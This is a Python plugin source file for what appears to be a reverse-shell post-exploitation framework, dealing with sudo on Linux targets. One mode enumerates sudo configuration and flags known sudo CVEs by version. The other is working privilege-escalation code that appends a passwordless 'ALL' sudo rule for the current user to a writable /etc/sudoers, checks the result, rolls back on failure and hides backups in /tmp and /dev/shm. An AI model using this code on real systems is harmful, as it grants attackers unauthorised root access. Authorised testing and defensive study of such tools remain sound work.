"""Sudo configuration audit and NOPASSWD exploitation."""

import re

from ...constants import PLUGIN_MARK_END, PLUGIN_MARK_START
from ..api import plugin, SessionContext
from ._helpers import build_linux_collector_command
from ..shared.common import format_generic_report
from ..shared.runner import (
    run_collector_plugin,
    _run_collector_marked,
    parse_collector_json,
)


_USAGE = """sudoers — Sudo configuration audit and NOPASSWD exploitation.

Usage:
  run sudoers -eu, --enumerate    Enumerate sudo configuration
  run sudoers -exp, --exploit     Append "<user> ALL=(ALL) NOPASSWD: ALL"
                                  to /etc/sudoers if it is writable
  run sudoers -h, --help          Show this help

Notes:
  - -eu returns findings strictly related to sudo and sudoers: binary
    version, rights, NOPASSWD entries, sudoers.d, aliases, Defaults,
    include directives, sudo.conf, and known sudo CVEs.
  - -exp runs entirely on the target. It checks writability first, and if
    /etc/sudoers is not writable it exits without modifying anything.
  - On a successful write, sudo -n -l validates the file (visudo -c is
    used opportunistically with a baseline comparison). On any failure
    the original file is restored from an in-memory backup.
"""


# ---------------------------------------------------------------------------
# Enumeration script (runs on target)
# ---------------------------------------------------------------------------

def _enumerate_source():
    return r'''
import os
import re
import subprocess

result = {
    'summary': {},
    'binary': {},
    'version': {},
    'rights': [],
    'nopasswd_entries': [],
    'sudoers_root': [],
    'sudoers_d': [],
    'aliases': {
        'User_Alias': [],
        'Runas_Alias': [],
        'Host_Alias': [],
        'Cmnd_Alias': [],
    },
    'defaults': [],
    'includes': [],
    'sudo_conf': {},
    'plugins': [],
    'timestamp_dir': {},
    'writable_sudoers': [],
    'group_memberships': [],
    'cves': [],
    'notes': [],
}


def sh(cmd, timeout=6):
    try:
        out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=timeout)
        return out.decode('utf-8', 'ignore') if isinstance(out, bytes) else out
    except Exception:
        return ''


def is_writable(path):
    try:
        return os.path.exists(path) and os.access(path, os.W_OK)
    except Exception:
        return False


def is_readable(path):
    try:
        return os.path.isfile(path) and os.access(path, os.R_OK)
    except Exception:
        return False


# --- Sudo binary ---
sudo_path = ''
for p in ('/usr/bin/sudo', '/bin/sudo', '/usr/local/bin/sudo', '/usr/sbin/sudo'):
    if os.path.exists(p):
        sudo_path = p
        break

result['binary'] = {
    'path': sudo_path or '(not found)',
    'exists': bool(sudo_path),
}

if sudo_path:
    try:
        st = os.stat(sudo_path)
        result['binary']['mode'] = oct(st.st_mode & 0o7777)
        result['binary']['owner_uid'] = st.st_uid
        result['binary']['setuid'] = bool(st.st_mode & 0o4000)
    except Exception:
        pass


# --- Sudo version ---
sudo_ver_line = ''
sudo_ver_full = ''
if sudo_path:
    sudo_ver_line = sh(f'{sudo_path} --version 2>/dev/null | head -1').strip()
    sudo_ver_full = sh(f'{sudo_path} -V 2>/dev/null | head -10').strip()

result['version'] = {
    'short': sudo_ver_line or '(unavailable)',
    'detail': sudo_ver_full[:400] if sudo_ver_full else '',
}

# Parse numeric version for CVE matching
ver_num = ''
m = re.search(r'(\d+\.\d+\.\d+(?:p\d+)?)', sudo_ver_line)
if m:
    ver_num = m.group(1)
    result['version']['parsed'] = ver_num


# --- Known sudo CVEs (version-based heuristic) ---
def _ver_tuple(s):
    parts = re.split(r'[.p]', s)
    try:
        return tuple(int(x) for x in parts if x.isdigit())
    except Exception:
        return ()


def _lt(a, b):
    a_t = _ver_tuple(a)
    b_t = _ver_tuple(b)
    n = max(len(a_t), len(b_t))
    a_t = a_t + (0,) * (n - len(a_t))
    b_t = b_t + (0,) * (n - len(b_t))
    return a_t < b_t


cves = []
if ver_num:
    # CVE-2021-3156 (Baron Samedit) — heap overflow in sudoedit; affects
    # 1.8.2 through 1.8.31p2, and 1.9.0 through 1.9.5p1
    if (_lt('1.8.1', ver_num) and _lt(ver_num, '1.8.32')) or \
       (_lt('1.8.31p2', ver_num) and _lt(ver_num, '1.9.5p2')):
        cves.append('CVE-2021-3156 (Baron Samedit — sudoedit heap overflow)')
    # CVE-2021-23239 — information disclosure via sudoedit
    if _lt('1.8.1', ver_num) and _lt(ver_num, '1.9.5'):
        cves.append('CVE-2021-23239 (sudoedit symlink information disclosure)')
    # CVE-2019-14287 — Runas bypass with -u#-1
    if _lt('1.8.0', ver_num) and _lt(ver_num, '1.8.28'):
        cves.append('CVE-2019-14287 (Runas bypass via -u#-1)')
    # CVE-2019-18634 — pwfeedback stack overflow
    if _lt('1.7.0', ver_num) and _lt(ver_num, '1.8.26'):
        cves.append('CVE-2019-18634 (pwfeedback stack overflow)')
    # CVE-2023-22809 — sudoedit arbitrary file write via EDITOR
    if _lt('1.8.0', ver_num) and _lt(ver_num, '1.9.12p2'):
        cves.append('CVE-2023-22809 (sudoedit arbitrary file write via EDITOR)')

result['cves'] = cves


# --- sudo -n -l (rights) ---
sudo_list = sh(f'{sudo_path} -n -l 2>&1', timeout=8) if sudo_path else ''
if sudo_list:
    for line in sudo_list.splitlines():
        s = line.strip()
        if not s:
            continue
        result['rights'].append(s[:300])
        if 'NOPASSWD' in s:
            result['nopasswd_entries'].append(s[:300])


# --- /etc/sudo.conf ---
sudo_conf = '/etc/sudo.conf'
if os.path.exists(sudo_conf):
    if is_readable(sudo_conf):
        try:
            for line in open(sudo_conf, errors='ignore'):
                s = line.strip()
                if s and not s.startswith('#'):
                    result['sudo_conf'].setdefault('lines', []).append(s[:200])
        except Exception:
            pass
    result['sudo_conf']['present'] = True
    result['sudo_conf']['writable'] = is_writable(sudo_conf)
else:
    result['sudo_conf']['present'] = False


# --- Sudo plugin config ---
plugin_dir = '/etc/sudoers.d'
for candidate in ('/etc/sudo.conf',):
    pass


# --- /etc/sudoers parsing ---
ALIAS_RE = re.compile(r'^(User_Alias|Runas_Alias|Host_Alias|Cmnd_Alias)\s+(\w+)\s*=\s*(.+)$')
DEFAULTS_RE = re.compile(r'^Defaults(?:[:@!>][^\s]+)?\s+(.+)$')
INCLUDE_RE = re.compile(r'^(@include|#include|@includedir|#includedir)\s+(.+)$')

sudoers_root = '/etc/sudoers'
if os.path.exists(sudoers_root):
    if is_readable(sudoers_root):
        try:
            for raw in open(sudoers_root, errors='ignore'):
                s = raw.rstrip('\n').strip()
                if not s or s.startswith('#'):
                    continue
                result['sudoers_root'].append(s[:300])

                alias_m = ALIAS_RE.match(s)
                if alias_m:
                    kind, name, body = alias_m.groups()
                    result['aliases'][kind].append({
                        'name': name,
                        'value': body[:200],
                    })
                    continue

                defaults_m = DEFAULTS_RE.match(s)
                if defaults_m:
                    result['defaults'].append(s[:200])
                    continue

                include_m = INCLUDE_RE.match(s)
                if include_m:
                    result['includes'].append({
                        'directive': include_m.group(1),
                        'path': include_m.group(2)[:200],
                    })
                    continue
        except Exception as exc:
            result['notes'].append(f'error reading /etc/sudoers: {exc}')
    if is_writable(sudoers_root):
        result['writable_sudoers'].append(sudoers_root)


# --- /etc/sudoers.d ---
sudoers_d = '/etc/sudoers.d'
if os.path.isdir(sudoers_d):
    try:
        for entry in sorted(os.listdir(sudoers_d))[:50]:
            full = os.path.join(sudoers_d, entry)
            if not os.path.isfile(full):
                continue

            file_entry = {
                'file': entry,
                'lines': [],
                'writable': is_writable(full),
            }

            if is_readable(full):
                try:
                    for raw in open(full, errors='ignore'):
                        s = raw.rstrip('\n').strip()
                        if not s or s.startswith('#'):
                            continue
                        file_entry['lines'].append(s[:300])

                        alias_m = ALIAS_RE.match(s)
                        if alias_m:
                            kind, name, body = alias_m.groups()
                            result['aliases'][kind].append({
                                'name': name,
                                'value': body[:200],
                                'file': entry,
                            })

                        defaults_m = DEFAULTS_RE.match(s)
                        if defaults_m:
                            result['defaults'].append(f'{entry}: {s[:200]}')
                except Exception:
                    pass

            result['sudoers_d'].append(file_entry)

            if file_entry['writable']:
                result['writable_sudoers'].append(full)
    except Exception as exc:
        result['notes'].append(f'error walking /etc/sudoers.d: {exc}')


# --- Sudo timestamp dir ---
timestamp_info = {'present': False, 'writable': False, 'files': 0}
for td in ('/var/run/sudo/ts', '/run/sudo/ts'):
    if os.path.isdir(td):
        timestamp_info['present'] = True
        timestamp_info['path'] = td
        timestamp_info['writable'] = is_writable(td)
        try:
            timestamp_info['files'] = len(os.listdir(td))
        except Exception:
            pass
        break
result['timestamp_dir'] = timestamp_info


# --- Group memberships relevant to sudo only ---
current_groups = set(sh('id -nG 2>/dev/null').split())
sudo_groups = {'sudo', 'wheel'}
for g in sorted(current_groups):
    if g in sudo_groups:
        result['group_memberships'].append(g)


# --- Summary ---
result['summary'] = {
    'sudo_binary': sudo_path or 'not found',
    'sudo_version': (sudo_ver_line or '(unavailable)')[:80],
    'sudo_rights_lines': len(result['rights']),
    'nopasswd_entries': len(result['nopasswd_entries']),
    'sudoers_root_lines': len(result['sudoers_root']),
    'sudoers_d_files': len(result['sudoers_d']),
    'aliases_total': sum(len(v) for v in result['aliases'].values()),
    'defaults_entries': len(result['defaults']),
    'include_directives': len(result['includes']),
    'sudo_conf_present': result['sudo_conf'].get('present', False),
    'writable_sudoers': len(result['writable_sudoers']),
    'sudo_group_membership': len(result['group_memberships']),
    'cves_matched': len(result['cves']),
    'notes': len(result['notes']),
}

_emit(result)
'''


# ---------------------------------------------------------------------------
# Exploit script (runs on target)
# ---------------------------------------------------------------------------

def _exploit_source():
    return r'''
import os
import re
import shutil
import subprocess

SUDOERS = '/etc/sudoers'
BACKUP  = '/tmp/.tn.sudoers.bak'
BACKUP2 = '/dev/shm/.tn.sudoers.bak'

VISUDO_CANDIDATES = (
    'visudo',
    '/usr/sbin/visudo',
    '/sbin/visudo',
    '/usr/local/sbin/visudo',
    '/usr/bin/visudo',
)

result = {
    'ok': False,
    'user': '',
    'writable': False,
    'appended': False,
    'already_present': False,
    'syntax_ok': False,
    'syntax_check_skipped': False,
    'syntax_output': '',
    'verify_ok': False,
    'rollback_done': False,
    'reason': '',
    'sudoers_path': SUDOERS,
    'entry': '',
    'visudo_path': '',
}


def sh(cmd, timeout=6):
    try:
        out = subprocess.check_output(
            cmd, shell=True, stderr=subprocess.STDOUT, timeout=timeout,
        )
        return out.decode('utf-8', 'ignore') if isinstance(out, bytes) else out
    except Exception:
        return ''


def read_bytes(path):
    try:
        with open(path, 'rb') as fh:
            return fh.read()
    except Exception:
        return None


def write_bytes(path, data):
    try:
        with open(path, 'wb') as fh:
            fh.write(data)
        return True
    except Exception:
        return False


def find_visudo():
    for candidate in VISUDO_CANDIDATES:
        if os.path.sep in candidate:
            if os.path.isfile(candidate) and os.access(candidate, os.X_OK):
                return candidate
        else:
            found = shutil.which(candidate)
            if found:
                return found
    return None


def real_write_test(path):
    try:
        fd = os.open(path, os.O_WRONLY | os.O_APPEND)
        os.close(fd)
        return True, ''
    except OSError as exc:
        return False, f"{exc.strerror or exc} (errno={exc.errno})"


def main():
    r = result

    user = (sh('id -un 2>/dev/null').strip()
            or sh('whoami 2>/dev/null').strip())
    if not user or not re.match(r'^[A-Za-z0-9_.-]+$', user):
        r['reason'] = 'could not determine current username'
        return r
    r['user'] = user

    if not os.path.exists(SUDOERS):
        r['reason'] = f'{SUDOERS} does not exist'
        return r

    writable, why = real_write_test(SUDOERS)
    if not writable:
        r['reason'] = (
            f'{SUDOERS} is not writable by {user} — {why}. '
            f'Privilege escalation not possible with current permissions'
        )
        return r
    r['writable'] = True

    entry = f"{user} ALL=(ALL) NOPASSWD: ALL"
    r['entry'] = entry

    original = read_bytes(SUDOERS)
    if original is None:
        r['reason'] = f'could not read {SUDOERS}'
        return r

    if entry.encode() in original:
        r['already_present'] = True
        r['ok'] = True
        r['syntax_ok'] = True
        r['verify_ok'] = True
        r['reason'] = 'entry already present — nothing to do'
        return r

    write_bytes(BACKUP, original)
    write_bytes(BACKUP2, original)

    try:
        with open(SUDOERS, 'rb') as fh:
            fh.seek(-1, 2)
            last = fh.read(1)
        needs_newline = last not in (b'\n', b'\r')
    except Exception:
        needs_newline = True

    try:
        with open(SUDOERS, 'ab') as fh:
            if needs_newline:
                fh.write(b'\n')
            fh.write(entry.encode('utf-8'))
            fh.write(b'\n')
        r['appended'] = True
    except OSError as exc:
        r['reason'] = f'append failed: {exc.strerror or exc}'
        return r

    after = read_bytes(SUDOERS)
    if after is None or entry.encode() not in after:
        r['reason'] = 'entry missing after write — rolling back'
        if write_bytes(SUDOERS, original):
            r['rollback_done'] = True
        return r

    visudo = find_visudo()
    r['visudo_path'] = visudo or ''

    baseline_ok = None
    baseline_out = ''
    if visudo:
        try:
            bp = subprocess.run(
                [visudo, '-c'], capture_output=True, text=True, timeout=10,
            )
            baseline_out = (bp.stdout + bp.stderr).strip()
            baseline_ok = (bp.returncode == 0)
        except Exception:
            baseline_ok = None

    if visudo and baseline_ok is not None:
        try:
            pp = subprocess.run(
                [visudo, '-c'], capture_output=True, text=True, timeout=10,
            )
            post_out = (pp.stdout + pp.stderr).strip()
            r['syntax_output'] = post_out[:400]

            if pp.returncode == 0:
                r['syntax_ok'] = True
            elif baseline_ok is False:
                if post_out == baseline_out:
                    r['syntax_ok'] = True
                    r['syntax_check_skipped'] = True
                    r['syntax_output'] = (
                        'pre-existing syntax issue (unchanged by our write): '
                        + post_out[:300]
                    )
                else:
                    if write_bytes(SUDOERS, original):
                        r['rollback_done'] = True
                    r['reason'] = (
                        'visudo now reports different errors than before '
                        '— original restored'
                    )
                    return r
            else:
                if write_bytes(SUDOERS, original):
                    r['rollback_done'] = True
                r['reason'] = (
                    f'visudo failed after write (exit {pp.returncode}) '
                    f'— original restored'
                )
                return r
        except Exception as exc:
            r['syntax_check_skipped'] = True
            r['syntax_output'] = f'visudo execution error: {exc}'
    else:
        r['syntax_check_skipped'] = True
        r['syntax_output'] = (
            'visudo not available or could not run '
            '(non-root shells often cannot run it)'
        )

    verify = sh('sudo -n -l 2>&1')
    verify_lower = verify.lower()

    if 'syntax error' in verify_lower or 'parse error' in verify_lower:
        if write_bytes(SUDOERS, original):
            r['rollback_done'] = True
        r['reason'] = (
            'sudo -n -l reports a syntax error in sudoers '
            '— original restored'
        )
        return r

    if 'NOPASSWD' in verify and 'ALL' in verify:
        r['verify_ok'] = True

    r['ok'] = True

    for path in (BACKUP, BACKUP2):
        try:
            os.remove(path)
        except Exception:
            pass

    return r


_emit(main())
'''


# ---------------------------------------------------------------------------
# Command builders
# ---------------------------------------------------------------------------

def _build_enumerate_command():
    return build_linux_collector_command(_enumerate_source())


def _build_exploit_command():
    return build_linux_collector_command(_exploit_source())


# ---------------------------------------------------------------------------
# Custom formatter — sudoers-focused, grouped by topic
# ---------------------------------------------------------------------------

def _format_sudoers_report(data: dict) -> str:
    if not data:
        return "sudoers: no data collected."

    lines = []
    summary = data.get('summary') or {}

    # --- Summary ---
    lines.append("== SUMMARY ==")
    for key in (
        'sudo_binary', 'sudo_version',
        'sudo_rights_lines', 'nopasswd_entries',
        'sudoers_root_lines', 'sudoers_d_files',
        'aliases_total', 'defaults_entries', 'include_directives',
        'sudo_conf_present', 'writable_sudoers',
        'sudo_group_membership', 'cves_matched', 'notes',
    ):
        if key in summary:
            lines.append(f"  {key:<24} {summary[key]}")

    # --- Sudo binary ---
    binary = data.get('binary') or {}
    if binary:
        lines.append("")
        lines.append("== SUDO BINARY ==")
        lines.append(f"  path       {binary.get('path', '?')}")
        lines.append(f"  setuid     {binary.get('setuid', '?')}")
        if binary.get('mode'):
            lines.append(f"  mode       {binary.get('mode')}")

    # --- Version ---
    version = data.get('version') or {}
    if version.get('short'):
        lines.append("")
        lines.append("== VERSION ==")
        lines.append(f"  {version.get('short')}")

    # --- CVEs ---
    cves = data.get('cves') or []
    if cves:
        lines.append("")
        lines.append("== RELEVANT CVEs ==")
        for cve in cves:
            lines.append(f"  * {cve}")

    # --- Rights ---
    rights = data.get('rights') or []
    if rights:
        lines.append("")
        lines.append("== SUDO RIGHTS (-n -l) ==")
        for r in rights[:60]:
            lines.append(f"  {r}")

    # --- NOPASSWD ---
    nopasswd = data.get('nopasswd_entries') or []
    if nopasswd:
        lines.append("")
        lines.append("== NOPASSWD ENTRIES ==")
        for entry in nopasswd[:60]:
            lines.append(f"  * {entry}")

    # --- Aliases ---
    aliases = data.get('aliases') or {}
    alias_total = sum(len(v) for v in aliases.values() if isinstance(v, list))
    if alias_total:
        lines.append("")
        lines.append("== ALIASES ==")
        for kind in ('User_Alias', 'Runas_Alias', 'Host_Alias', 'Cmnd_Alias'):
            items = aliases.get(kind) or []
            if not items:
                continue
            lines.append(f"  {kind}:")
            for item in items[:30]:
                src = f"  ({item.get('file')})" if item.get('file') else ''
                lines.append(
                    f"    {item.get('name', '?')} = {item.get('value', '')}{src}"
                )

    # --- Defaults ---
    defaults = data.get('defaults') or []
    if defaults:
        lines.append("")
        lines.append("== DEFAULTS ==")
        for d in defaults[:60]:
            lines.append(f"  {d}")

    # --- Include directives ---
    includes = data.get('includes') or []
    if includes:
        lines.append("")
        lines.append("== INCLUDE DIRECTIVES ==")
        for inc in includes:
            lines.append(
                f"  {inc.get('directive', '?')}  {inc.get('path', '')}"
            )

    # --- /etc/sudoers contents ---
    root_lines = data.get('sudoers_root') or []
    if root_lines:
        lines.append("")
        lines.append("== /etc/sudoers ==")
        for rl in root_lines[:80]:
            lines.append(f"  {rl}")

    # --- /etc/sudoers.d ---
    sd = data.get('sudoers_d') or []
    if sd:
        lines.append("")
        lines.append("== /etc/sudoers.d ==")
        for item in sd:
            flag = " [WRITABLE]" if item.get('writable') else ""
            lines.append(f"  {item.get('file', '?')}{flag}")
            for ln in (item.get('lines') or [])[:20]:
                lines.append(f"    {ln}")

    # --- sudo.conf ---
    sc = data.get('sudo_conf') or {}
    if sc.get('present'):
        lines.append("")
        lines.append("== /etc/sudo.conf ==")
        for ln in (sc.get('lines') or [])[:30]:
            lines.append(f"  {ln}")

    # --- Timestamp dir ---
    ts = data.get('timestamp_dir') or {}
    if ts.get('present'):
        lines.append("")
        lines.append("== SUDO TIMESTAMP DIR ==")
        lines.append(f"  path      {ts.get('path', '?')}")
        lines.append(f"  writable  {ts.get('writable', '?')}")
        lines.append(f"  files     {ts.get('files', 0)}")

    # --- Writable sudoers ---
    writable = data.get('writable_sudoers') or []
    if writable:
        lines.append("")
        lines.append("== WRITABLE SUDOERS FILES ==")
        for w in writable:
            lines.append(f"  * {w}")

    # --- Group memberships ---
    groups = data.get('group_memberships') or []
    if groups:
        lines.append("")
        lines.append("== SUDO-RELEVANT GROUP MEMBERSHIP ==")
        for g in groups:
            lines.append(f"  {g}")

    # --- Notes ---
    notes = data.get('notes') or []
    if notes:
        lines.append("")
        lines.append("== NOTES ==")
        for n in notes:
            lines.append(f"  {n}")

    return "\n".join(lines)


# ---------------------------------------------------------------------------
# Modes
# ---------------------------------------------------------------------------

def _run_enumerate(session: SessionContext) -> int:
    return run_collector_plugin(
        session,
        'sudoers',
        _build_enumerate_command,
        None,
        _format_sudoers_report,
        timeout=60.0,
    )


def _run_exploit(session: SessionContext) -> int:
    c = session.colors
    session.log_event('sudoers: exploit mode started')

    session.print(
        f"{c['cyan']}Running exploit on target via reverse shell "
        f"(no local operations).{c['end']}"
    )

    session._handler._flush_shell(session._client_sock, timeout=1.0)

    cmd = _build_exploit_command()
    raw = _run_collector_marked(session, cmd, None, 'unix', timeout=60.0)
    if raw is None:
        session.print(
            f"{c['red']}Exploit aborted — no response from target."
            f"{c['end']}"
        )
        session.log_plugin_result(
            'sudoers', '', 'exploit: no response from target'
        )
        return 1

    data = parse_collector_json(raw)
    if not data:
        session.print(
            f"{c['red']}Exploit aborted — could not parse target result."
            f"{c['end']}"
        )
        session.log_plugin_result('sudoers', raw[:400], 'exploit: parse error')
        return 1

    user = data.get('user') or '?'
    entry = data.get('entry') or ''
    reason = data.get('reason') or ''

    session.print("")
    session.print(f"{c['cyan']}SUDOERS EXPLOIT — session #{session.session_id}{c['end']}")
    session.print("-" * 60)
    session.print(f"  Target sudoers: {data.get('sudoers_path', '/etc/sudoers')}")
    session.print(f"  Current user:   {user}")
    writable_display = (
        f"{c['green']}yes{c['end']}" if data.get('writable')
        else f"{c['red']}no{c['end']}"
    )
    session.print(f"  Writable:       {writable_display}")

    if not data.get('writable'):
        session.print("")
        session.print(f"{c['red']}{reason or '/etc/sudoers is not writable'}{c['end']}")
        session.print(
            f"{c['yellow']}No modification was performed. Exiting.{c['end']}"
        )
        session.log_plugin_result(
            'sudoers', '', f'exploit: not writable ({reason})'
        )
        return 1

    if data.get('already_present'):
        session.print(f"  Entry:          {entry}")
        session.print("")
        session.print(
            f"{c['green']}Entry already present — no changes made.{c['end']}"
        )
        session.log_plugin_result(
            'sudoers', f'Entry present for {user}', entry
        )
        return 0

    if data.get('appended'):
        session.print(f"  Appended:       {entry}")

    if data.get('syntax_ok') and not data.get('syntax_check_skipped'):
        session.print(f"  Syntax check:   {c['green']}passed (visudo -c){c['end']}")
    elif data.get('syntax_check_skipped'):
        extra = data.get('syntax_output') or 'visudo not available'
        session.print(
            f"  Syntax check:   {c['yellow']}skipped ({extra[:80]}){c['end']}"
        )
    else:
        session.print(f"  Syntax check:   {c['red']}FAILED{c['end']}")

    if data.get('verify_ok'):
        session.print(
            f"  Live verify:    {c['green']}sudo -n -l confirms NOPASSWD{c['end']}"
        )

    if data.get('rollback_done'):
        session.print(
            f"  Rollback:       {c['yellow']}original /etc/sudoers restored{c['end']}"
        )

    session.print("")

    if data.get('ok'):
        session.print(
            f"{c['green']}Exploit complete: {user} now has passwordless sudo."
            f"{c['end']}"
        )
        session.log_plugin_result(
            'sudoers',
            f'Exploit successful for user {user}',
            entry,
        )
        return 0

    session.print(
        f"{c['red']}Exploit failed: {reason or 'unknown error'}{c['end']}"
    )
    session.log_plugin_result('sudoers', '', f'exploit failed: {reason}')
    return 1


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

@plugin.command(
    name='sudoers',
    platforms=['linux', 'unix'],
    description='Sudo configuration audit and NOPASSWD exploitation (-eu / -exp)',
)
def run(session: SessionContext, args):
    if not args:
        session.print(_USAGE)
        return 0

    mode = args[0].lower()

    if mode in ('-h', '--help', 'help'):
        session.print(_USAGE)
        return 0

    if mode in ('-eu', '--enumerate', 'enumerate'):
        return _run_enumerate(session)

    if mode in ('-exp', '--exploit', 'exploit'):
        return _run_exploit(session)

    session.print(f"Unknown argument: {mode}", 'red')
    session.print(_USAGE)
    return 1